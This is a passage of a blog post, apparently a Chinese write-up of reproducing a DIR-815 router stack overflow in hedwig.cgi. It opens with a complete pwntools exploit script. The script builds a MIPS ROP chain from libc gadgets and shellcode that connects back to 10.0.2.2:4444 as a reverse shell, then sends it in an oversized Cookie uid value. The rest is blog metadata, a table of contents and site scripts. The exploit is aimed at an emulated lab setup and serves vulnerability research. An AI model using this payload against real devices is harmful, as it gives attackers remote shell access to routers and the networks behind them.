class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:6666/hedwig.cgi&quot;</span></span><br><span class="line">solid = <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=/runtime/session/&quot;</span></span><br><span class="line">slen = <span class="built_in">len</span>(solid)</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x77f34000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># move $t9, $a1 ; addiu $a0, $a0, 0x4c ; jr $t9 ; move $a1, $a2</span></span><br><span class="line">gad1 = <span class="number">0x37E6C</span> + libc</span><br><span class="line"><span class="comment"># addiu $a1, $sp, 0x18 ; move $t9, $s4 ; jalr $t9 ; move $s5, $v0</span></span><br><span class="line">gad2 = <span class="number">0x3B974</span> + libc</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x5A448</span> + libc</span><br><span class="line">printf = <span class="number">0x2D890</span> + libc</span><br><span class="line">system = <span class="number">0x53200</span> + libc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gad1: &quot;</span> + <span class="built_in">hex</span>(gad1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gad2: &quot;</span> + <span class="built_in">hex</span>(gad2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh: &quot;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;printf: &quot;</span> + <span class="built_in">hex</span>(printf))</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.0.2.2&quot;</span></span><br><span class="line">port = <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">sc  = shellcraft.mips.linux.connect(ip, port)</span><br><span class="line">sc += shellcraft.mips.linux.dup2(<span class="string">&quot;$s0&quot;</span>, <span class="number">0</span>)</span><br><span class="line">sc += shellcraft.mips.linux.dup2(<span class="string">&quot;$s0&quot;</span>, <span class="number">1</span>)</span><br><span class="line">sc += shellcraft.mips.linux.dup2(<span class="string">&quot;$s0&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sc += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    li $a0, <span class="subst">&#123;binsh&#125;</span></span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -8</span></span><br><span class="line"><span class="string">    sw $a0, 0x360($sp)</span></span><br><span class="line"><span class="string">    xor $s2, $s2, $s2</span></span><br><span class="line"><span class="string">    sw $s2, 0x364($sp)</span></span><br><span class="line"><span class="string">    addiu $a1, $sp, 0x360</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 0xfab</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;shellcode length: &quot; + str(len(shellcode)))</span></span><br><span class="line"><span class="comment"># print(b&quot;shellcode: &quot; + shellcode)</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">1024</span> - slen)*<span class="string">b&quot;A&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;B&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;C&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;D&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;E&quot;</span></span><br><span class="line">payload += p32(gad1)</span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;G&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;H&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;I&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;J&quot;</span></span><br><span class="line">payload += p32(gad2)</span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;L&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;M&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;N&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;O&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;P&quot;</span></span><br><span class="line">payload += <span class="number">4</span>*<span class="string">b&quot;Q&quot;</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;atker&quot;</span>: <span class="string">&quot;fun&quot;</span>&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = data, headers = header)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> DIR-815 栈溢出漏洞复现</li>
+        <li><strong>Author:</strong> Findkey</li>
+        <li><strong>Created at
+                :</strong> 2026-05-21 11:17:46</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-21 11:23:54
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://find-key.github.io/2026/05/21/dir-815-router/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/IOT/">#IOT</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/27/v8-learn-2/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">V8 学习笔记  0x02</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">DIR-815 栈溢出漏洞复现</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E7%A6%BB"><span class="nav-text">固件分离</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BF%E7%9C%9F%E8%BF%90%E8%A1%8C"><span class="nav-text">仿真运行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%86%85%E6%A0%B8%E6%96%87%E4%BB%B6"><span class="nav-text">下载内核文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">构建文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="nav-text">运行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-text">漏洞程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hedwigcgi-main"><span class="nav-text">hedwigcgi_main</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sess-get-uid"><span class="nav-text">sess_get_uid</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88"><span class="nav-text">调试方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">反弹 shell</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Findkey</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        16 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
